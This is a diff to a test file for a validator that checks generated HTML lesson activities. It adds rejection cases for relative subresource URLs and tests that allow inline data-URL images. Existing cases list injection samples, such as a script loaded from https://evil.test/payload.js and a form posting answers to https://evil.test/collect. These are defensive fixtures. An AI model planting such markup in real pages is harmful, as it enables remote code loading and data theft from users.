@@ -83,6 +83,10 @@ describe("activity artifact contracts", () => {
     ["script injection", "<script src='https://evil.test/payload.js'></script>", "external or executable URL references are forbidden"],
     ["unsafe event handler", "<button onclick='window.top.location=`https://evil.test`'>Salir</button>", "inline event handlers are forbidden"],
     ["external network reference", "<img src='https://evil.test/tracker.png'>", "external or executable URL references are forbidden"],
+    ["root-relative subresource", "<img src='/activity.js'>", "external or executable URL references are forbidden"],
+    ["dot-relative subresource", "<script src='./main.js'></script>", "external or executable URL references are forbidden"],
+    ["relative poster", "<video poster='asset.png'></video>", "external or executable URL references are forbidden"],
+    ["relative srcset candidate", "<img srcset='asset.png 1x'>", "external or executable URL references are forbidden"],
     ["form submission", "<form action='https://evil.test/collect'><input name='answer'></form>", "forms are forbidden"],
     ["storage access", "<script>localStorage.setItem('answer', 'secret')</script>", "localStorage is forbidden"],
     ["layout replacement", "<script>document.write('<main>replacement</main>')</script>", "document.write is forbidden"],
@@ -103,6 +107,38 @@ describe("activity artifact contracts", () => {
 
     expect(result.ok).toBe(false);
     expect(result.errors).toContain(reason);
+  });
+
+  it("allows data URLs for inline assets", () => {
+    const context = buildActivitySessionContext([lessonState]);
+    const [candidate] = createActivityArtifactCandidates({
+      lessonState,
+      sessionContext: context,
+      curriculumMatches,
+    });
+    candidate.bundle_html = candidate.bundle_html.replace(
+      "</body>",
+      '<img src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" srcset="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs= 1x" alt="Punto"> </body>',
+    );
+
+    expect(verifyActivityArtifact(candidate).ok).toBe(true);
+  });
+
+  it("rejects relative srcset candidates after an allowed data URL", () => {
+    const context = buildActivitySessionContext([lessonState]);
+    const [candidate] = createActivityArtifactCandidates({
+      lessonState,
+      sessionContext: context,
+      curriculumMatches,
+    });
+    candidate.bundle_html = candidate.bundle_html.replace(
+      "</body>",
+      '<img srcset="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs= 1x, asset.png 2x" alt="Punto"> </body>',
+    );
+
+    const result = verifyActivityArtifact(candidate);
+    expect(result.ok).toBe(false);
+    expect(result.errors).toContain("external or executable URL references are forbidden");
   });
 
   it("validates SDK telemetry messages", () => {
